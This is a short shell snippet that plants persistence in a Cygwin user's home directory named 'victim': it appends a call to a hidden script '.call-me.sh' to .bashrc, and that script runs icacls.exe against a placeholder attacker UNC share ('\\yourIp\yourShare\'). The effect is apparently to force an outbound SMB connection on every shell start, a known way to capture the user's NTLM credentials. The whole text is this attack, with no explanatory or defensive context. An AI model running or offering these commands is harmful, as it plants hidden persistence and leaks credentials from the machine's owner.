cd ..\..\Cygwin64\home\victim
echo ./.call-me.sh >> .bashrc
echo icacls.exe "\\yourIp\yourShare\" >> .call-me.sh

chmod u+x .call-me.sh
exit
